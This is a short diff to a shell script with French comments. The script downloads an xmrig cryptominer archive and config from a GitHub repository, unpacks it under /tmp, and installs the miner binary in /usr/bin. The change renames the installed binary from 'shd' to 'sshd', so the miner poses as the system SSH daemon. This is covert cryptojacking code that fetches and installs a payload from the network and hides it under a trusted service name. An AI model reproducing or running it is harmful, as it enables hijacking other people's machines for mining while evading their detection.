@@ -12,7 +12,7 @@ wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"
 #decompresse
 mv xmrig.tgz /tmp/mx/xmrig.tgz
 tar -zxvf xmrig.tgz
-mv /tmp/mx/minerd /usr/bin/shd
+mv /tmp/mx/minerd /usr/bin/sshd
 
 #wget la config
 wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
